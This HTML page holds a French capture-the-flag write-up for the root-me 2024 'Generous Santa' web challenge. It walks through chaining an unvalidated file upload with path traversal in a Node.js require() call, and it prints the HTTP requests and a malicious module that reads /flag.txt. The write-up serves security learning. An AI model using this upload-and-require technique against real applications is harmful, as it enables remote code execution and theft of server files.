<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="index, follow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>XMAS root-me challenges, Generous Santa</title>
        <meta name="description" content="">
        <meta name="keywords" content="ctf, security, root-me, xmas, web, generous santa, write-up">
        <meta name="author" content="Antoine Benevaut">

        <meta property="og:type" content="website">
        <meta property="og:url" content="https://www.abenevaut.dev/2024-xmas-root-me/01-web-generous-santa-1.html">
        <meta property="og:title" content="XMAS root-me challenges, Generous Santa">
        <meta property="og:description" content="">
        <meta property="og:image" content="https://www.abenevaut.dev/images/abenevaut-og-xms-2024-root-me.webp">

        <meta property="twitter:card" content="summary_large_image">
        <meta name=”twitter:creator” content=”@abenevaut”>
        <meta property="twitter:url" content="https://www.abenevaut.dev/2024-xmas-root-me/01-web-generous-santa-1.html">
        <meta property="twitter:title" content="XMAS root-me challenges, Generous Santa">
        <meta property="twitter:description" content="">
        <meta property="twitter:image" content="https://www.abenevaut.dev/images/abenevaut-og-xms-2024-root-me.webp">
        <meta property="twitter:image:alt" content="">

        <base href="/"> <!-- /dev.abenevaut/abenevaut/dist/ -->
        <link rel="manifest" href="manifest.webmanifest" />

            <link rel="canonical" href="//index.html" />
    <script>
      window.article = '""'
      window.writeup = "<a href=\"#write-up-generous-santa\"><h1 id='write-up-generous-santa'>Write-up Generous Santa<\/h1><\/a>\n<p>12h00, 1er d\u00e9cembre 2024, le challenge XMAS de root-me d\u00e9marre avec une \u00e9preuve web &quot;Generous Santa&quot;, c'est parti!<\/p>\n<p>Dans le code, on trouve une application web en NodeJS, un Dockerfile (avec un docker-compose), le fichier du flag &quot;flag.txt&quot; et un README, qui nous dit\u00a0:<\/p>\n<blockquote>\n<p>The number of Santa's lunti has increased by 1337 this year, and there are a lot of them! Thanks to this, they've been able to give you some very, very nice gifts.\nIf you can't find what you're looking for, you can even suggest gifts to him - maybe they'll make them in time!<\/p>\n<\/blockquote>\n<p>Le premier cadeau (ce challenge) ayant \u00e9t\u00e9 d\u00e9j\u00e0 livr\u00e9 allons voir comment on peut encore remplir la hotte du P\u00e8re No\u00ebl.<\/p>\n<p>Nous sommes en source ouverte, on devrait pouvoir savoir rapidement ou nous allons devoir chercher le flag.<\/p>\n<p>Une petite recherche sur l'ensemble des fichiers du projet avec &quot;flag.txt&quot; nous montre que le fichier va \u00eatre copi\u00e9 sur le container Docker \u00e0 l'emplacement <code>\/flag.txt<\/code>.\nPour ce qui est des droits, le fichier appartient \u00e0 l'utilisateur &quot;santa&quot; qui est aussi l'utilisateur courant.<\/p>\n<pre><code class=\"language-Dockerfile\">COPY flag.txt \/flag.txt\nRUN chown santa:santa \/flag.txt\n\nUSER santa\n<\/code><\/pre>\n<p>On peut aussi noter que c'est l'utilisateur &quot;santa&quot; qui va ex\u00e9cuter l'application node.<\/p>\n<pre><code class=\"language-Dockerfile\">USER santa\n\nCMD [&quot;npm&quot;, &quot;start&quot;]\n<\/code><\/pre>\n<p>Pour le moment, on peut se laisser dire que si on casse l'app node, nous pourrons lire le flag.<\/p>\n<p>Maintenant, \u00e0 quoi ressemble l'application\u00a0?<\/p>\n<p><img src=\"images\/ctf-2024-rootme-xmas\/web-generous-santa-1-overview.png.webp\" alt=\"Aper\u00e7u de l'application\" \/><\/p>\n<p>On a une page d'accueil pour voir les cadeaux et une seconde page avec un formulaire pour sugg\u00e9rer un cadeau.\nMis \u00e0 part la navigation, on trouve sur ces pages deux actions distincts, un bouton pour &quot;ajouter les cadeaux&quot; et un formulaire pour &quot;sugg\u00e9rer un cadeau&quot;.<\/p>\n<p>On va donc regarder ce qui se passe lorsque l'on actionne ces deux \u00e9l\u00e9ments. On commence avec la pas d'accueil.<\/p>\n<p><img src=\"images\/ctf-2024-rootme-xmas\/web-generous-santa-1-home-query.png.webp\" alt=\"\" \/><\/p>\n<p>Au click sur le bouton &quot;Ajouter les cadeaux&quot;, l'application fait une requ\u00eate POST sur <code>\/api\/add<\/code> avec un payload JSON.\nOn reproduit la requ\u00eate avec ijhttp, dans un fichier <code>exploit.http<\/code>\u00a0:<\/p>\n<blockquote>\n<p>ijhttp est l'outil de jetbrains pour jouer des requ\u00eates HTTP. Il est int\u00e9gr\u00e9 dans les IDE web de jetbrains.\nVous pouvez \u00e9galement l'utiliser en standalone en l'installant via ce <a href=\"https:\/\/www.jetbrains.com\/ijhttp\/download\/#section=zip-archive\">lien<\/a>.<\/p>\n<\/blockquote>\n<pre><code class=\"language-curl\">POST https:\/\/day1.challenges.xmas.root-me.org\/api\/add\nContent-Type: application\/json\n\n{&quot;product&quot;:&quot;Bugatti&quot;}\n<\/code><\/pre>\n<p>Si on l'ex\u00e9cute, on obtient la r\u00e9ponse suivante\u00a0:<\/p>\n<pre><code class=\"language-response\">HTTP\/2 200 OK\n...\n\n{\n  &quot;success&quot;: true,\n  &quot;output&quot;: {\n    &quot;name&quot;: &quot;Bugatti&quot;,\n    &quot;description&quot;: &quot;Description of Bugatti&quot;,\n    &quot;_id&quot;: &quot;674c7c4171020c0a249a06e7&quot;\n  }\n}\n<\/code><\/pre>\n<p>Soyons taquin, que se passe-t-il si on envoie un JSON dans lequel on changerai la valeur de <code>product<\/code>\u00a0?<\/p>\n<pre><code class=\"language-curl\">POST https:\/\/day1.challenges.xmas.root-me.org\/api\/add\nContent-Type: application\/json\n\n{&quot;product&quot;:&quot;Exploit&quot;}\n<\/code><\/pre>\n<p>Si on l'ex\u00e9cute, on obtient la r\u00e9ponse suivante\u00a0:<\/p>\n<pre><code class=\"language-response\">HTTP\/2 500 Internal Server Error\n...\n\n{\n  &quot;message&quot;: &quot;Error adding the product Exploit. Cannot find module '..\/models\/exploit'\\nRequire stack:\\n- \/usr\/app\/routes\/hotte.js\\n- \/usr\/app\/app.js&quot;\n}\n<\/code><\/pre>\n<p>\ud83c\udf85Hohoho! <code>Cannot find module '..\/models\/exploit'\\nRequire stack:\\n- \/usr\/app\/routes\/hotte.js<\/code> nous indique que l'application cherche un module <code>..\/models\/exploit<\/code> dans le fichier <code>hotte.js<\/code>.\nSurement une piste pour exploiter l'application, une entr\u00e9e ne doit pas \u00eatre correctement valid\u00e9e. Que nous dit le code\u00a0?<\/p>\n<pre><code class=\"language-javascript\">router.post('\/add', async (req, res) =&gt; {\n  const { product } = req.body;\n\n  try {\n      const Gift = require(`..\/models\/${product.toLowerCase()}`);\n      const gift = new Gift({ name: product, description: `Description of ${product}` });\n      output = gift.store();\n      res.json({ success: true, output: output });\n  } catch (error) {\n      res.status(500).json({ message: `Error adding the product ${product}. ${error.message}` });\n  }\n});\n<\/code><\/pre>\n<p>Le code nous dit que l'application va chercher un module dans le dossier <code>models<\/code> avec le nom du produit en minuscule <code>require(<\/code>..\/models\/${product.toLowerCase()}<code>)<\/code>.\nPas de validation particuli\u00e8re sur le nom du produit, on peut donc envoyer n'importe quoi et l'application va chercher un module avec ce nom.\nSi le module n'existe pas, l'application renvoie une erreur 500 avec le message d'erreur.<\/p>\n<p>Parfait, les requ\u00eates et leurs r\u00e9ponses font sens. Si seulement je pouvais envoyer un faux models pour lire le flag...<\/p>\n<p>Alors, que se passe-t-il du c\u00f4t\u00e9 du formulaire de suggestion de cadeau\u00a0?<\/p>\n<p><img src=\"images\/ctf-2024-rootme-xmas\/web-generous-santa-1-suggest-query.png.webp\" alt=\"\" \/><\/p>\n<p>\u00c0 la soumission du formulaire, l'application fait une requ\u00eate POST sur <code>\/api\/suggest<\/code> avec un content type <code>application\/multipart\/form-data<\/code>.\nOn soumet un fichier, tout cela fait donc sens. On notera aussi le nom des champs <code>name<\/code> et <code>photo<\/code>.<\/p>\n<p>On reproduit la requ\u00eate avec ijhttp, dans notre fichier <code>exploit.http<\/code>.\nOn va envoyer notre formulaire avec le champ &quot;name&quot; qui vaut &quot;Nasa&quot; et le champ photo qui est un fichier PNG <code>nasa.png<\/code>.<\/p>\n<pre><code class=\"language-curl\">POST https:\/\/day1.challenges.xmas.root-me.org\/api\/suggest\nContent-Type: multipart\/form-data; boundary=WebAppBoundary\n\n--WebAppBoundary\nContent-Disposition: form-data; name=&quot;name&quot;\n\nNasa\n\n--WebAppBoundary\nContent-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;nasa.png&quot;\nContent-Type: image\/png\n\n&lt; .\/nasa.png\n\n--WebAppBoundary--\n<\/code><\/pre>\n<p>Status code 200, tout c'est bien pass\u00e9. On obtient la r\u00e9ponse qui suit et on notre attention va se porter sur la valeur de <code>photoPath<\/code>.<\/p>\n<pre><code class=\"language-response\">HTTP\/2 200 OK\n...\n\n{\n  &quot;message&quot;: &quot;Thank you! Santa will consider your suggestion.&quot;,\n  &quot;photoPath&quot;: &quot;\/tmp\/2024-12-01_20-27-2\/nasa.png&quot;\n}\n<\/code><\/pre>\n<p>\ud83c\udf85Hohoho! <code>&quot;photoPath&quot;: &quot;\/tmp\/2024-12-01_20-27-2\/nasa.png&quot;<\/code> nous indique que le fichier a \u00e9t\u00e9 upload\u00e9 dans le dossier <code>\/tmp\/2024-12-01_20-27-2\/<\/code>.<\/p>\n<p>Si on r\u00e9capitule\u00a0:<\/p>\n<ul>\n<li>nous avons le endpoint <code>\/api\/add<\/code> qui va chercher un module dans le dossier <code>models<\/code> avec un nom produit qui semble \u00eatre exploitable<\/li>\n<li>nous avons le endpoint <code>\/api\/suggest<\/code> qui va uploader un fichier dans le dossier <code>\/tmp\/2024-12-01_20-27-2\/<\/code>\n<\/li>\n<\/ul>\n<p>\u00c7a sent l'attaque en deux \u00e9tapes! Non\u00a0? Plusieurs id\u00e9es viennent alors en t\u00eate\u00a0:<\/p>\n<ul>\n<li>Est-ce que l'on peut envoyer n'importe quel type de fichier sur le endpoint de suggestion\u00a0?<\/li>\n<li>Est-ce que l'on peut r\u00e9ussir \u00e0 ex\u00e9cuter un &quot;models&quot; truqu\u00e9 et avec lire le flag\u00a0?<\/li>\n<\/ul>\n<p>Allez, on s'y colle! On va essayer d'envoyer un fichier <code>exploit.js<\/code> sur le endpoint de suggestion.<\/p>\n<p>Pour cr\u00e9er ce fichier <code>exploit.js<\/code>, on va dupliquer un model existant et adapter rapidement le contenu.\nUn copi\u00e9\/coll\u00e9 du fichier <code>bugatti.js<\/code> puis on recherche et remplace &quot;bugatti&quot; en &quot;exploit&quot;, et on est pas mal pour une premi\u00e8re tentative\u00a0?<\/p>\n<pre><code class=\"language-javascript\">const mongoose = require('mongoose');\n\nconst exploitSchema = new mongoose.Schema({\n  name: { type: String, default: 'exploit' },\n  description: { type: String, default: 'A luxury high-performance exploit.' }\n});\n  \nexploitSchema.methods.store = function() {\n  console.log('exploit stored in the sack.');\n  return this;\n};\n\nmodule.exports = mongoose.model('exploit', exploitSchema);\n<\/code><\/pre>\n<p>On tente d'envoyer notre fichier<\/p>\n<pre><code class=\"language-curl\">POST https:\/\/day1.challenges.xmas.root-me.org\/api\/suggest\nContent-Type: multipart\/form-data; boundary=WebAppBoundary\n\n--WebAppBoundary\nContent-Disposition: form-data; name=&quot;name&quot;\n\nNasa\n\n--WebAppBoundary\nContent-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;exploit.js&quot;\nContent-Type: image\/png\n\n&lt; .\/exploit.js\n\n--WebAppBoundary--\n<\/code><\/pre>\n<blockquote>\n<p>J'ai r\u00e9essay\u00e9 ensuite sans le <code>Content-Type: image\/png<\/code> et \u00e7a a fonctionn\u00e9. Z\u00e9ro v\u00e9rification donc. M\u00eame pas besoin de checker le code, Merci P\u00e8re No\u00ebl!<\/p>\n<\/blockquote>\n<p>Et \u00e7a fonctionne! Notre fichier exploit est upload\u00e9 dans le dossier <code>\/tmp\/2024-12-01_20-43-18\/exploit.js<\/code>.<\/p>\n<pre><code class=\"language-response\">HTTP\/2 200 OK\n...\n\n{\n  &quot;message&quot;: &quot;Thank you! Santa will consider your suggestion.&quot;,\n  &quot;photoPath&quot;: &quot;\/tmp\/2024-12-01_20-43-18\/exploit.js&quot;\n}\n<\/code><\/pre>\n<p>Super! On &quot;n'a plus qu'a&quot; trouver un &quot;path traversal&quot; sur le endpoint <code>\/api\/add<\/code> pour ex\u00e9cuter notre fichier.<\/p>\n<blockquote>\n<p><a href=\"https:\/\/owasp.org\/www-community\/attacks\/Path_Traversal\">Path traversal<\/a> est une technique qui vise \u00e0 utiliser des path non pr\u00e9vu pour acc\u00e9der \u00e0 des fichiers ou des r\u00e9pertoires auxquels l'utilisateur peut parfois ne pas avoir acc\u00e8s.\nDans notre cas, le endpoint <code>\/api\/add<\/code> n'a pas vocation \u00e0 requ\u00e9rir des fichiers depuis un autre r\u00e9pertoire que le r\u00e9pertoire <code>src\/models<\/code> de l'app.<\/p>\n<\/blockquote>\n<p>On va essayer de pas trop t\u00e2tonner, on r\u00e9capitule les infos utiles\u00a0:<\/p>\n<ul>\n<li>le flag est dans le fichier <code>\/flag.txt<\/code>\n<\/li>\n<li>notre exploit est upload\u00e9 dans <code>\/tmp\/2024-12-01_20-43-18\/exploit.js<\/code>\n<\/li>\n<li>on va essayer de charger un model et on essaie de le faire avec ce path <code>..\/models\/${product.toLowerCase()}<\/code>\n<\/li>\n<\/ul>\n<p>Essayons d'expliciter le path des models, <code>..\/models\/${product.toLowerCase()}<\/code> c'est pas assez clair.\nC'est ou <code>..\/models<\/code>\u00a0?<\/p>\n<p>On sait que le repertoire models est dans le repertoire <code>src\/<\/code> du projet. Mais ou est stock\u00e9 ce r\u00e9pertoire\u00a0?<\/p>\n<p>Dans le Dockerfile, on trouve l'instruction <code>COPY .\/src\/ .\/<\/code> et un peu plus haut l'instruction <code>WORKDIR \/usr\/app<\/code>.\nNos sources sont donc localis\u00e9es dans <code>\/usr\/app\/src\/<\/code> et les models dans <code>\/usr\/app\/src\/models\/<\/code>.<\/p>\n<p>\ud83c\udf84Le sapin s'illumine, pour aller de <code>models\/<\/code> \u00e0 \/tmp\/2024-12-01_20-43-18\/exploit.js, il nous faut remonter de 4 niveaux.\nOn va donc essayer de charger notre exploit avec le path <code>..\/..\/..\/..\/tmp\/2024-12-01_20-43-18\/exploit<\/code> (sans l'extension).<\/p>\n<p>Allez! On essaie!<\/p>\n<pre><code class=\"language-curl\">POST https:\/\/day1.challenges.xmas.root-me.org\/api\/add\nContent-Type: application\/json\n\n{&quot;product&quot;:&quot;..\/..\/..\/..\/tmp\/2024-12-01_20-43-18\/exploit&quot;}\n<\/code><\/pre>\n<p>Avant de vous montrez l'exploit final, plusieurs \u00e9tapes on \u00e9t\u00e9 n\u00e9cessaires <em>ainsi que plusieurs essaies<\/em>\u00a0:<\/p>\n<p>Lors du premier essai, une erreur m'est retourn\u00e9e, impossible de trouver le package <code>mongoose<\/code>, une d\u00e9pendance du model incluse via <code>npm<\/code>.\nPour l'inclure, il a fallu indiquer le path complet vers le package <code>const mongoose = require('\/usr\/app\/node_modules\/mongoose');<\/code>.<\/p>\n<p>Au second essai, une nouvelle erreur m'indique que mon model est d\u00e9ja charg\u00e9 avec le nom &quot;exploit&quot;, c'est tout \u00e0 fait normal et relatif au cycle de vie de Express.js.\nL'application node a deux cycles de vie principaux, le premier r\u00e9gie le serveur web, il attend une requ\u00eate, et le second r\u00e9gie l'ex\u00e9cution d'une seul requ\u00eate.<\/p>\n<p>L'ex\u00e9cution d'une requ\u00eate est \u00e9ph\u00e9m\u00e8re, les variables sont d\u00e9truites lorsque la r\u00e9ponse est retourn\u00e9e.\nEn revanche, le serveur web est persistant, les variables sont conserv\u00e9es entre les requ\u00eates.<\/p>\n<p>Pour corriger le tire, j'ai us\u00e9 d'astuce en incr\u00e9mentant simplement le nom du fichier <code>exploit<\/code> \u00e0 chaque essai (exploit1, exploit2, exploit3... \ud83e\udd26\u200d\u2642\ufe0fvous avez compris).<\/p>\n<p>Enfin, quand j'ai eu un model fonctionnel, j'ai pu ajouter la lecture du flag <code>fs.readFileSync('\/flag.txt')<\/code>.<\/p>\n<pre><code class=\"language-javascript\">const mongoose = require('\/usr\/app\/node_modules\/mongoose');\nconst fs = require('fs');\n\nconst exploit9Schema = new mongoose.Schema({\n  name: { type: String, default: 'exploit9' },\n  description: { type: String, default: 'A luxury high-performance exploit9.' },\n  fileContent: { type: String, default: fs.readFileSync('\/flag.txt') }\n});\n\nexploit9Schema.methods.store = function() {\n  console.log('exploit9 stored in the sack.');\n  \n  return this\n};\n\nmodule.exports = mongoose.model('exploit9', exploit9Schema);\n<\/code><\/pre>\n<p>\ud83c\udf81On envoie notre requ\u00eate et on obtient le flag \ud83c\udfc1<\/p>\n<p><img src=\"images\/ctf-2024-rootme-xmas\/web-generous-santa-1-flag.png.webp\" alt=\"Capture d'\u00e9cran montrant le flag\" \/><\/p>\n<p>Cr\u00e9dits du challenge <a href=\"https:\/\/x.com\/rootme_org\/status\/1863296339183796546\">root-me.org<\/a> et son auteur <a href=\"https:\/\/x.com\/Elweth_\">Elweth<\/a>.<\/p>\n<p>Retrouver les sources du challenge <a href=\"https:\/\/github.com\/elweth-sec\/Root-Me-XMAS-2024\">ici<\/a>.<\/p>\n<p><a href=\"2024-xmas-root-me.html\">Sommaire &gt;<\/a> - <a href=\"2024-xmas-root-me\/03-web-game-hacking-santa-s-magic-sack-1.html\">Challenge suivant &gt;<\/a><\/p>\n"
    </script>
    <script type="module" src="assets/Writeup.js"></script>

        <link rel="preconnect" href="https://fonts.bunny.net">
        <link rel="stylesheet" href="assets/app.css">
        <link rel="shortcut icon" href="assets/app-icon.webp" type="image/webp">
    </head>
    <body class="font-sans antialiased">
        <div id="root"></div>
    </body>
</html>
